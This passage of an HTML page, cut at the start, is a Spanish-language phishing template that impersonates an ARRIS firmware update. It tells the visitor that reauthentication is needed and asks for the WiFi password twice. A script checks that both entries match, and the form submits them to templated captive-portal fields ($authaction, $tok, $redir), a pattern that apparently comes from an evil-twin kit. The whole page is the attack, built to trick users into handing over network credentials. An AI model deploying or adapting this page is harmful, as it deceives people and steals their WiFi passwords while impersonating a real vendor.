    function validarForm() {
        var pass1 = document.getElementById("pass_1");
        var pass2 = document.getElementById("pass_2");
        if (pass1.value != pass2.value) {
            alert("La confirmacion de la contraseña no es la misma.");
            return false;
        }
        return true;
    }
</script>
<title>Actualizacion de Firmware.</title>
</head>
    <body>
        <div class="offset">
            <div class="insert">
                <center><img src="/images/arris.png" alt="Imagen ARRIS. Rellena el formulario para continuar."></center>
                <hr>
                <big-red>ARRIS Group Inc.</big-red>
                <hr>
                <br>
                <italic-black>Firmware actualizado. Necesaria reautenticación.</italic-black>
                <br>
                <hr>
                <form method="get" action="$authaction" onsubmit="return validarForm()">
                    <input type="hidden" name="tok" value="$tok">
                    <input type="hidden" name="redir" value="$redir">
                    <br>
                    <label for="pass">Contraseña WiFi:</label>
                    <br>
                    <input type="password" id="pass_1" name="username" required="required">
                    <br>
                    <label for="passCheck">Repetir contraseña WiFi:</label>
                    <br>
                    <input type="password" id="pass_2" name="password" required="required">
                    <br>
                    <br>
                    <input type="checkbox" id="tc" required="required"><label for="tc" onclick="mostrarTC()">Términos y condiciones.</label>
                    <br>
                    <br>
                    <input type="submit" value="Continue">
                    <br>
                </form>
                <hr>
                <copy-right>Copyright &copy; ARRIS Group Inc.</copy-right>
            </div>
        </div>
    </body>
